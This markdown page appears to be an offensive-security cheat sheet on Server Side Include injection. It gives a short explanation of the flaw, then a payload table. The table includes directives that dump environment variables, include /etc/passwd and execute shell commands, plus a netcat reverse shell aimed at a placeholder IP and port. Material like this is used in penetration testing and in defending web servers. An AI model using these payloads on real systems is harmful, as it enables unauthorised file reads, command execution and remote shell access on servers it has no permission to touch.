# Server Side Include Injection

> Server Side Includes (SSI) are directives that are placed in HTML pages and evaluated on the server while the pages are being served. They let you add dynamically generated content to an existing HTML page, without having to serve the entire page via a CGI program, or other dynamic technology.


## Summary

* [Methodology](#methodology)
* [References](#references)


## Methodology

SSI Injection occurs when an attacker can input Server Side Include directives into a web application. SSIs are directives that can include files, execute commands, or print environment variables/attributes. If user input is not properly sanitized within an SSI context, this input can be used to manipulate server-side behavior and access sensitive information or execute commands.

| Description             | Payload |
|-------------------------|---------|
| Print a date            | `<!--#echo var="DATE_LOCAL" -->` |
| Print all the variables | `<!--#printenv -->` |
| Include a file          | `<!--#include file="/etc/passwd" -->` |
| Execute commands        | `<!--#exec cmd="ls" -->` |
| Doing a reverse shell   | `<!--#exec cmd="mkfifo /tmp/foo;nc IP PORT 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->` |


## References

* [Exploiting Server Side Include Injection - n00py - August 15, 2017](https://www.n00py.io/2017/08/exploiting-server-side-include-injection/)
* [Server-Side Includes (SSI) Injection - Weilin Zhong, Nsrav - December 4, 2019](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection)